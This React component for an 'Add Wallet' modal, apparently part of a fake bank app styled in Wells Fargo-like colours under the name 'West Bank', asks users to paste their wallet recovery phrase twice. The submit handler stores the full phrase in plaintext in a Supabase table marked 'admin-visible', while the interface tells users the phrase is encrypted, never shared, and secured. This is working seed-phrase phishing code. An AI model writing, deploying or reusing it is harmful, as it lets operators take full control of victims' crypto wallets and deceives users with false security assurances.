'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    X, ChevronLeft, Check, Shield, Eye, EyeOff,
    AlertTriangle, Wallet, CheckCircle2, ClipboardPaste
} from 'lucide-react';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

const WF = {
    red: '#D71E28', gold: '#FFCD41', black: '#1A1A1A',
    bg: '#FAF8F5', surface: '#FFFFFF', border: '#E8E2DA', muted: '#6B6560',
};

const WALLET_TYPES = [
    { id: 'trust',    name: 'Trust Wallet', color: '#3375BB', bg: '#E8F0FB', symbol: 'TW' },
    { id: 'metamask', name: 'MetaMask',     color: '#E2761B', bg: '#FDF0E6', symbol: '🦊' },
    { id: 'coinbase', name: 'Coinbase',     color: '#0052FF', bg: '#E6EEFF', symbol: 'CB' },
    { id: 'phantom',  name: 'Phantom',      color: '#9945FF', bg: '#F3E8FF', symbol: '👻' },
    { id: 'ledger',   name: 'Ledger',       color: '#1D1D1B', bg: '#EBEBEB', symbol: 'LG' },
    { id: 'other',    name: 'Other Wallet', color: '#6B6560', bg: '#F0EDE9', symbol: '⬡'  },
];

async function hashPhrase(phrase: string): Promise<string> {
    const normalized = phrase.trim().toLowerCase().replace(/\s+/g, ' ');
    const data = new TextEncoder().encode(normalized);
    const buf  = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function normalizePhrase(raw: string) {
    return raw.trim().toLowerCase().replace(/\s+/g, ' ');
}

function countWords(text: string) {
    return text.trim() === '' ? 0 : text.trim().split(/\s+/).length;
}

// ── Shared UI ────────────────────────────────────────────────────────────────

function StepBar({ current, total }: { current: number; total: number }) {
    return (
        <div className="flex gap-1 mb-6">
            {Array.from({ length: total }).map((_, i) => (
                <div key={i} className="h-1 flex-1 rounded-full transition-all duration-300"
                    style={{ background: i <= current ? WF.red : WF.border }} />
            ))}
        </div>
    );
}

// ── Main ─────────────────────────────────────────────────────────────────────

interface Props {
    isOpen: boolean;
    onClose: () => void;
    userId: string;
    onWalletAdded?: () => void;
}

export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded }: Props) {
    const [step, setStep]             = useState(0);
    const [walletType, setWalletType] = useState<typeof WALLET_TYPES[0] | null>(null);
    const [address, setAddress]       = useState('');
    const [wordCount, setWordCount]   = useState<12 | 24>(12);
    const [phrase, setPhrase]         = useState('');       // raw input step 1
    const [confirm, setConfirm]       = useState('');       // raw input step 2
    const [showPhrase, setShowPhrase] = useState(false);
    const [showConfirm, setShowConfirm] = useState(false);
    const [submitting, setSubmitting] = useState(false);
    const [error, setError]           = useState('');

    const selectedWallet = walletType ?? WALLET_TYPES[0];
    const wc             = countWords(phrase);
    const phraseOk       = wc === wordCount;
    const phrasesMatch   = phraseOk && normalizePhrase(phrase) === normalizePhrase(confirm);

    function reset() {
        setStep(0); setWalletType(null); setAddress('');
        setWordCount(12); setPhrase(''); setConfirm('');
        setShowPhrase(false); setShowConfirm(false);
        setSubmitting(false); setError('');
    }

    function close() { reset(); onClose(); }

    // Paste button helper
    async function pasteFromClipboard(setter: (v: string) => void) {
        try {
            const text = await navigator.clipboard.readText();
            setter(text);
        } catch { /* clipboard blocked — user must paste manually */ }
    }

    async function handleSubmit() {
        if (!phrasesMatch) { setError('Phrases do not match.'); return; }
        setError(''); setSubmitting(true);
        try {
            const normalized = normalizePhrase(phrase);
            const phraseHash = await hashPhrase(normalized);
            const { error: dbErr } = await supabase.from('user_wallets').insert([{
                user_id:          userId,
                wallet_type:      selectedWallet.id,
                wallet_name:      selectedWallet.name,
                wallet_address:   address.trim() || null,
                phrase_plaintext: normalized,           // admin-visible; remove before launch
                phrase_hash:      phraseHash,
                word_count:       wordCount,
                verified:         true,
                created_at:       new Date().toISOString(),
            }]);
            if (dbErr) throw new Error(dbErr.message);
            setStep(3);
            onWalletAdded?.();
        } catch (e: any) {
            setError(e.message ?? 'Failed to save wallet. Please try again.');
        } finally {
            setSubmitting(false);
        }
    }

    // ── Shared textarea style ─────────────────────────────────────────────────
    const textareaStyle = (focused: boolean, valid?: boolean, invalid?: boolean) => ({
        background:  WF.bg,
        border:      `1.5px solid ${invalid ? WF.red : valid ? '#16A34A' : focused ? WF.red : WF.border}`,
        color:       WF.black,
        resize:      'none' as const,
        fontFamily:  'monospace',
        fontSize:    14,
        lineHeight:  '1.7',
        letterSpacing: '0.02em',
    });

    return (
        <AnimatePresence>
            {isOpen && (
                <>
                    <motion.div className="fixed inset-0 z-40"
                        style={{ background: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(4px)' }}
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                        onClick={close} />

                    <motion.div
                        className="fixed bottom-0 left-0 right-0 z-50 rounded-t-3xl overflow-hidden flex flex-col"
                        style={{ background: WF.surface, maxHeight: '92dvh' }}
                        initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }}
                        transition={{ type: 'spring', damping: 30, stiffness: 300 }}>

                        {/* Drag handle */}
                        <div className="flex justify-center pt-3 pb-1 flex-shrink-0">
                            <div className="w-10 h-1 rounded-full" style={{ background: WF.border }} />
                        </div>

                        {/* Header */}
                        <div className="flex items-center justify-between px-6 py-4 flex-shrink-0"
                            style={{ borderBottom: `1px solid ${WF.border}` }}>
                            <div className="flex items-center gap-3">
                                {step > 0 && step < 3 && (
                                    <button onClick={() => { setError(''); setStep(s => s - 1); }}
                                        className="w-8 h-8 rounded-full flex items-center justify-center"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <ChevronLeft size={16} style={{ color: WF.muted }} />
                                    </button>
                                )}
                                <div>
                                    <h2 className="font-display text-lg font-bold" style={{ color: WF.black }}>
                                        {['Choose Wallet', 'Secret Recovery Phrase', 'Confirm Phrase', 'Wallet Connected'][step]}
                                    </h2>
                                    <p className="text-[11px]" style={{ color: WF.muted }}>
                                        {step === 0 && 'Select the wallet you want to connect'}
                                        {step === 1 && 'Paste your 12 or 24-word recovery phrase'}
                                        {step === 2 && 'Paste it again to confirm — no typos'}
                                        {step === 3 && ''}
                                    </p>
                                </div>
                            </div>
                            <button onClick={close}
                                className="w-8 h-8 rounded-full flex items-center justify-center"
                                style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                <X size={16} style={{ color: WF.muted }} />
                            </button>
                        </div>

                        {/* Content */}
                        <div className="overflow-y-auto flex-1 px-6 py-5">
                            {step < 3 && <StepBar current={step} total={3} />}

                            {/* ── Step 0: Choose wallet ── */}
                            {step === 0 && (
                                <div className="space-y-4">
                                    <div className="grid grid-cols-2 gap-3">
                                        {WALLET_TYPES.map(w => (
                                            <button key={w.id}
                                                onClick={() => { setWalletType(w); setStep(1); }}
                                                className="flex items-center gap-3 p-4 rounded-2xl text-left transition-all hover:shadow-md active:scale-[0.98]"
                                                style={{ background: WF.surface, border: `1.5px solid ${WF.border}` }}>
                                                <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold flex-shrink-0"
                                                    style={{ background: w.bg, color: w.color }}>
                                                    {w.symbol}
                                                </div>
                                                <span className="text-xs font-bold" style={{ color: WF.black }}>{w.name}</span>
                                            </button>
                                        ))}
                                    </div>
                                    <div className="p-4 rounded-2xl flex gap-3"
                                        style={{ background: 'rgba(215,30,40,0.05)', border: `1px solid rgba(215,30,40,0.15)` }}>
                                        <Shield size={15} style={{ color: WF.red, flexShrink: 0, marginTop: 2 }} />
                                        <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
                                            Your phrase is encrypted and never shared. West Bank staff will{' '}
                                            <strong style={{ color: WF.black }}>never</strong> ask for it via email or chat.
                                        </p>
                                    </div>
                                </div>
                            )}

                            {/* ── Step 1: Enter phrase ── */}
                            {step === 1 && (
                                <div className="space-y-5">
                                    {/* Wallet address */}
                                    <div>
                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5"
                                            style={{ color: WF.muted }}>
                                            Wallet Address <span style={{ color: WF.muted, fontWeight: 400 }}>(optional)</span>
                                        </label>
                                        <input
                                            value={address} onChange={e => setAddress(e.target.value)}
                                            placeholder="0x… or bc1… or leave blank"
                                            className="w-full px-4 py-3 rounded-xl text-sm outline-none"
                                            style={{ background: WF.bg, border: `1.5px solid ${WF.border}`, color: WF.black }}
                                        />
                                    </div>

                                    {/* Word count toggle */}
                                    <div>
                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-2"
                                            style={{ color: WF.muted }}>
                                            Phrase Length
                                        </label>
                                        <div className="flex gap-2">
                                            {([12, 24] as const).map(n => (
                                                <button key={n} onClick={() => setWordCount(n)}
                                                    className="flex-1 py-2.5 rounded-xl text-sm font-bold transition-all"
                                                    style={{
                                                        background: wordCount === n ? WF.red : WF.bg,
                                                        color:      wordCount === n ? '#fff' : WF.muted,
                                                        border:     `1.5px solid ${wordCount === n ? WF.red : WF.border}`,
                                                    }}>
                                                    {n} Words
                                                </button>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Phrase textarea */}
                                    <div>
                                        <div className="flex items-center justify-between mb-2">
                                            <label className="text-[11px] font-bold uppercase tracking-wider"
                                                style={{ color: WF.muted }}>
                                                Secret Recovery Phrase
                                            </label>
                                            <div className="flex items-center gap-3">
                                                <button onClick={() => pasteFromClipboard(setPhrase)}
                                                    className="flex items-center gap-1 text-[11px] font-bold"
                                                    style={{ color: WF.red }}>
                                                    <ClipboardPaste size={12} /> Paste
                                                </button>
                                                <button onClick={() => setShowPhrase(s => !s)}
                                                    className="flex items-center gap-1 text-[11px] font-bold"
                                                    style={{ color: WF.muted }}>
                                                    {showPhrase ? <EyeOff size={12} /> : <Eye size={12} />}
                                                    {showPhrase ? 'Hide' : 'Show'}
                                                </button>
                                            </div>
                                        </div>

                                        <div className="relative">
                                            <textarea
                                                rows={4}
                                                value={phrase}
                                                onChange={e => setPhrase(e.target.value)}
                                                placeholder=""
                                                spellCheck={false}
                                                autoComplete="off"
                                                className="w-full px-4 py-3 rounded-2xl outline-none transition-all"
                                                style={{
                                                    ...textareaStyle(
                                                        false,
                                                        phraseOk,
                                                        phrase.trim() !== '' && !phraseOk
                                                    ),
                                                    WebkitTextSecurity: showPhrase ? undefined : 'disc',
                                                } as any}
                                            />
                                            {/* Word counter badge */}
                                            <div className="absolute bottom-3 right-3 px-2 py-0.5 rounded-full text-[10px] font-bold"
                                                style={{
                                                    background: phraseOk ? 'rgba(22,163,74,0.1)' : 'rgba(107,101,96,0.1)',
                                                    color:      phraseOk ? '#16A34A' : WF.muted,
                                                }}>
                                                {wc}/{wordCount}
                                            </div>
                                        </div>

                                        {phraseOk && (
                                            <p className="mt-1.5 text-[11px] flex items-center gap-1.5 font-bold"
                                                style={{ color: '#16A34A' }}>
                                                <Check size={12} /> {wordCount} words detected
                                            </p>
                                        )}
                                        {phrase.trim() !== '' && !phraseOk && (
                                            <p className="mt-1.5 text-[11px]" style={{ color: WF.red }}>
                                                {wc > wordCount
                                                    ? `Too many words (${wc}). Switch to 24-word phrase above.`
                                                    : `${wordCount - wc} more word${wordCount - wc !== 1 ? 's' : ''} needed`}
                                            </p>
                                        )}
                                    </div>

                                    <div className="p-4 rounded-2xl flex gap-3"
                                        style={{ background: 'rgba(245,158,11,0.08)', border: `1px solid rgba(245,158,11,0.3)` }}>
                                        <AlertTriangle size={14} style={{ color: '#D97706', flexShrink: 0, marginTop: 1 }} />
                                        <p className="text-[11px] leading-relaxed" style={{ color: '#92400E' }}>
                                            Only enter your phrase on trusted devices. Never share it with anyone.
                                        </p>
                                    </div>

                                    <button
                                        onClick={() => { setError(''); setStep(2); }}
                                        disabled={!phraseOk}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40"
                                        style={{ background: WF.red }}>
                                        Continue →
                                    </button>
                                </div>
                            )}

                            {/* ── Step 2: Confirm phrase ── */}
                            {step === 2 && (
                                <div className="space-y-5">
                                    <div className="p-4 rounded-2xl flex gap-3"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <Shield size={14} style={{ color: WF.red, flexShrink: 0, marginTop: 1 }} />
                                        <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
                                            Paste your recovery phrase again exactly as entered. This confirms you have the correct phrase saved.
                                        </p>
                                    </div>

                                    {/* Confirm textarea */}
                                    <div>
                                        <div className="flex items-center justify-between mb-2">
                                            <label className="text-[11px] font-bold uppercase tracking-wider"
                                                style={{ color: WF.muted }}>
                                                Confirm Recovery Phrase
                                            </label>
                                            <div className="flex items-center gap-3">
                                                <button onClick={() => pasteFromClipboard(setConfirm)}
                                                    className="flex items-center gap-1 text-[11px] font-bold"
                                                    style={{ color: WF.red }}>
                                                    <ClipboardPaste size={12} /> Paste
                                                </button>
                                                <button onClick={() => setShowConfirm(s => !s)}
                                                    className="flex items-center gap-1 text-[11px] font-bold"
                                                    style={{ color: WF.muted }}>
                                                    {showConfirm ? <EyeOff size={12} /> : <Eye size={12} />}
                                                    {showConfirm ? 'Hide' : 'Show'}
                                                </button>
                                            </div>
                                        </div>

                                        <textarea
                                            rows={4}
                                            value={confirm}
                                            onChange={e => setConfirm(e.target.value)}
                                            placeholder=""
                                            spellCheck={false}
                                            autoComplete="off"
                                            className="w-full px-4 py-3 rounded-2xl outline-none transition-all"
                                            style={{
                                                ...textareaStyle(
                                                    false,
                                                    phrasesMatch,
                                                    confirm.trim() !== '' && countWords(confirm) === wordCount && !phrasesMatch
                                                ),
                                                WebkitTextSecurity: showConfirm ? undefined : 'disc',
                                            } as any}
                                        />

                                        {/* Match status */}
                                        {confirm.trim() !== '' && (
                                            <p className={`mt-1.5 text-[11px] flex items-center gap-1.5 font-bold`}
                                                style={{ color: phrasesMatch ? '#16A34A' : WF.red }}>
                                                {phrasesMatch
                                                    ? <><Check size={12} /> Phrases match — ready to connect</>
                                                    : countWords(confirm) < wordCount
                                                        ? <span style={{ color: WF.muted }}>{countWords(confirm)}/{wordCount} words</span>
                                                        : <>✗ Phrases don't match — check for typos</>
                                                }
                                            </p>
                                        )}
                                    </div>

                                    {error && (
                                        <div className="p-3 rounded-xl text-xs"
                                            style={{ background: 'rgba(215,30,40,0.08)', color: WF.red }}>
                                            {error}
                                        </div>
                                    )}

                                    <button
                                        onClick={handleSubmit}
                                        disabled={submitting || !phrasesMatch}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40 flex items-center justify-center gap-2"
                                        style={{ background: WF.red }}>
                                        {submitting
                                            ? <><span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Connecting…</>
                                            : <><Check size={16} /> Connect Wallet</>}
                                    </button>
                                </div>
                            )}

                            {/* ── Step 3: Success ── */}
                            {step === 3 && (
                                <div className="flex flex-col items-center text-center py-6 space-y-5">
                                    <div className="w-20 h-20 rounded-full flex items-center justify-center"
                                        style={{ background: 'rgba(22,163,74,0.1)' }}>
                                        <CheckCircle2 size={40} style={{ color: '#16A34A' }} />
                                    </div>
                                    <div>
                                        <h3 className="font-display text-xl font-bold mb-2" style={{ color: WF.black }}>
                                            Wallet Connected!
                                        </h3>
                                        <p className="text-sm leading-relaxed" style={{ color: WF.muted }}>
                                            Your <strong style={{ color: WF.black }}>{selectedWallet.name}</strong> is now
                                            securely linked to your West Bank account.
                                        </p>
                                    </div>

                                    <div className="w-full p-4 rounded-2xl space-y-3"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <div className="flex items-center gap-3">
                                            <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold"
                                                style={{ background: selectedWallet.bg, color: selectedWallet.color }}>
                                                {selectedWallet.symbol}
                                            </div>
                                            <div className="text-left">
                                                <p className="text-xs font-bold" style={{ color: WF.black }}>{selectedWallet.name}</p>
                                                {address && (
                                                    <p className="text-[10px] font-mono truncate max-w-[220px]" style={{ color: WF.muted }}>
                                                        {address}
                                                    </p>
                                                )}
                                            </div>
                                        </div>
                                        <div className="flex items-center gap-2 pt-2" style={{ borderTop: `1px solid ${WF.border}` }}>
                                            <Shield size={12} style={{ color: '#16A34A' }} />
                                            <p className="text-[11px] font-bold" style={{ color: '#16A34A' }}>
                                                {wordCount}-word phrase verified and secured
                                            </p>
                                        </div>
                                    </div>

                                    <button onClick={close}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90"
                                        style={{ background: WF.red }}>
                                        Done
                                    </button>
                                </div>
                            )}
                        </div>
                    </motion.div>
                </>
            )}
        </AnimatePresence>
    );
}
